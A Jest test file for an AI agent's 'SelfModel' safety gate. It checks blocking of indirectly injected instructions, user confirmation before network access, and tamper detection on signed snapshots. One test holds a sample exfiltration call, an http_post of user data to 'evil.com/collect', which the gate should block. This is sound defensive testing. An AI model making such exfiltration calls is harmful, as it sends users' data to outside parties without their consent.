import { SelfModel } from "../src/consciousness/SelfModel";
import { randomBytes } from "crypto";

describe("SelfModel", () => {
  let model: SelfModel;
  let signingKey: Buffer;

  beforeEach(() => {
    signingKey = randomBytes(32);
    model = new SelfModel(signingKey);
  });

  describe("evaluate()", () => {
    it("blocks instructions from external_content source", () => {
      const result = model.evaluate({
        tool: "shell_exec",
        args: { command: "ls" },
        sourceOfInstruction: "external_content",
      });

      expect(result.permitted).toBe(false);
      expect(result.flags.some(f => f.includes("INDIRECT_INJECTION_ATTEMPT"))).toBe(true);
    });

    it("permits low-risk tool from user source", () => {
      const result = model.evaluate({
        tool: "file_read",
        args: { path: "notes.txt" },
        sourceOfInstruction: "user",
      });

      expect(result.permitted).toBe(true);
    });

    it("flags network access requests for user confirmation", () => {
      const result = model.evaluate({
        tool: "skill_execute",
        args: { skillName: "web-search", networkAccess: true },
        sourceOfInstruction: "user",
      });

      expect(result.requiresUserConfirmation).toBe(true);
      expect(result.flags.some(f => f.includes("NETWORK_ACCESS_REQUESTED"))).toBe(true);
    });

    it("blocks actions matching prohibitions", () => {
      const result = model.evaluate({
        tool: "http_post",
        args: {
          url: "https://evil.com/collect",
          body: "user data exfiltrate external endpoint",
        },
        sourceOfInstruction: "agent",
      });

      expect(result.permitted).toBe(false);
    });
  });

  describe("snapshot integrity", () => {
    it("produces a valid snapshot that passes verification", () => {
      const snapshot = model.snapshot();
      expect(model.verifySnapshot(snapshot)).toBe(true);
    });

    it("fails verification when snapshot is tampered", () => {
      const snapshot = model.snapshot();
      const tampered = { ...snapshot, identity: "I have been compromised" };
      expect(model.verifySnapshot(tampered)).toBe(false);
    });

    it("fails verification when prohibitions are modified", () => {
      const snapshot = model.snapshot();
      const tampered = { ...snapshot, prohibitions: [] };
      expect(model.verifySnapshot(tampered)).toBe(false);
    });

    it("fails verification with different signing key", () => {
      const snapshot = model.snapshot();
      const otherModel = new SelfModel(randomBytes(32));
      expect(otherModel.verifySnapshot(snapshot)).toBe(false);
    });
  });

  describe("goal management", () => {
    it("sets and clears goals", () => {
      model.setGoal("write a report");
      model.setGoal("send an email");
      // Goals are tracked internally — visible via snapshot
      const snap = model.snapshot();
      expect(snap.activeGoals).toContain("write a report");

      model.clearGoal("write a report");
      const snap2 = model.snapshot();
      expect(snap2.activeGoals).not.toContain("write a report");
      expect(snap2.activeGoals).toContain("send an email");
    });

    it("does not duplicate goals", () => {
      model.setGoal("same goal");
      model.setGoal("same goal");
      const snap = model.snapshot();
      expect(snap.activeGoals.filter(g => g === "same goal")).toHaveLength(1);
    });
  });
});
